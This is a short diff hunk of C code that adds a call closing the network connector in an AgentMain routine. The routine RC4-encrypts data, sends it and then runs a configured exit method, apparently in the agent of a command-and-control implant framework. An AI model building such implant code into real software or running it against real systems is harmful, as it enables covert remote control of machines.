@@ -65,6 +65,7 @@ void AgentMain()
 	EncryptRC4(data, dataSize, g_Agent->SessionKey, 16);
 
 	g_Connector->SendData(data, dataSize, &recvDataSize);
+	g_Connector->CloseConnector();
 	AgentClear(g_Agent->config->exit_method);
 }
 
